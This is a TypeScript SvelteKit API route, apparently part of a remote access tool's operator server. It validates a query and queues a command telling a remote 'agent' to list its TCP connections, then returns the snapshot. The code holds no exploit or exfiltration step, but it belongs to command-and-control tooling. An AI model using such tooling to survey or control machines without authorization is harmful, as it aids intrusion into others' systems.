import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import { tcpConnectionsManager, TcpConnectionsError } from '$lib/server/rat/tcp-connections';
import type {
	TcpConnectionQuery,
	TcpConnectionSnapshot,
	TcpConnectionsCommandPayload,
	TcpConnectionState
} from '$lib/types/tcp-connections';

interface TcpConnectionStateResponse {
	snapshot: TcpConnectionSnapshot | null;
}

interface TcpConnectionsActionRequest {
	action: 'refresh';
	waitMs?: number;
	query?: TcpConnectionQuery;
}

const ALLOWED_STATES: readonly TcpConnectionState[] = [
	'LISTENING',
	'ESTABLISHED',
	'CLOSE_WAIT',
	'SYN_SENT',
	'SYN_RECEIVED',
	'FIN_WAIT_1',
	'FIN_WAIT_2',
	'TIME_WAIT',
	'LAST_ACK',
	'CLOSING',
	'BOUND',
	'CLOSED',
	'UNKNOWN'
];

function normalizeFilter(value: unknown): string | undefined {
	if (typeof value !== 'string') {
		return undefined;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return undefined;
	}
	return trimmed.slice(0, 128);
}

function normalizeState(value: unknown): TcpConnectionQuery['state'] | undefined {
	if (typeof value !== 'string') {
		return undefined;
	}
	const normalized = value.trim().toUpperCase();
	if (!normalized) {
		return undefined;
	}
	if (normalized === 'ALL') {
		return 'all';
	}
	if (ALLOWED_STATES.includes(normalized as TcpConnectionState)) {
		return normalized as TcpConnectionState;
	}
	return undefined;
}

function normalizeBoolean(value: unknown): boolean | undefined {
	if (typeof value === 'boolean') {
		return value;
	}
	return undefined;
}

function normalizeLimit(value: unknown): number | undefined {
	if (typeof value !== 'number' || Number.isNaN(value)) {
		return undefined;
	}
	const integer = Math.trunc(value);
	if (integer <= 0) {
		return undefined;
	}
	return Math.min(integer, 2048);
}

function normalizeQuery(input: TcpConnectionQuery | undefined): TcpConnectionQuery | undefined {
	if (!input || typeof input !== 'object') {
		return undefined;
	}

	const query: TcpConnectionQuery = {};
	const localFilter = normalizeFilter(input.localFilter);
	if (localFilter) {
		query.localFilter = localFilter;
	}
	const remoteFilter = normalizeFilter(input.remoteFilter);
	if (remoteFilter) {
		query.remoteFilter = remoteFilter;
	}
	const state = normalizeState(input.state);
	if (state) {
		query.state = state;
	}
	const includeIpv6 = normalizeBoolean(input.includeIpv6);
	if (includeIpv6 !== undefined) {
		query.includeIpv6 = includeIpv6;
	}
	const resolveDns = normalizeBoolean(input.resolveDns);
	if (resolveDns !== undefined) {
		query.resolveDns = resolveDns;
	}
	const limit = normalizeLimit(input.limit);
	if (limit !== undefined) {
		query.limit = limit;
	}

	return Object.keys(query).length > 0 ? query : undefined;
}

export const GET: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);

	const snapshot = tcpConnectionsManager.getSnapshot(id);
	return json({ snapshot } satisfies TcpConnectionStateResponse);
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let payload: TcpConnectionsActionRequest;
	try {
		payload = (await request.json()) as TcpConnectionsActionRequest;
	} catch {
		throw error(400, 'Invalid TCP connections action payload');
	}

	if (!payload || payload.action !== 'refresh') {
		throw error(400, 'Unsupported TCP connections action');
	}

	const waitMs = typeof payload.waitMs === 'number' ? payload.waitMs : undefined;
	const query = normalizeQuery(payload.query);

	const { requestId, wait } = tcpConnectionsManager.createRequest(id, waitMs);

	try {
		const command: TcpConnectionsCommandPayload = {
			action: 'enumerate',
			requestId,
			query
		};
		registry.queueCommand(
			id,
			{ name: 'tcp-connections', payload: command },
			{ operatorId: user.id }
		);
	} catch (err) {
		if (err instanceof RegistryError) {
			tcpConnectionsManager.failPending(
				id,
				requestId,
				new TcpConnectionsError(err.message, err.status)
			);
			throw error(err.status, err.message);
		}
		tcpConnectionsManager.failPending(
			id,
			requestId,
			new TcpConnectionsError('Failed to queue TCP connection request', 500)
		);
		throw error(500, 'Failed to queue TCP connection request');
	}

	try {
		const snapshot = await wait;
		return json({ snapshot } satisfies TcpConnectionStateResponse);
	} catch (err) {
		if (err instanceof TcpConnectionsError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to retrieve TCP connections');
	}
};
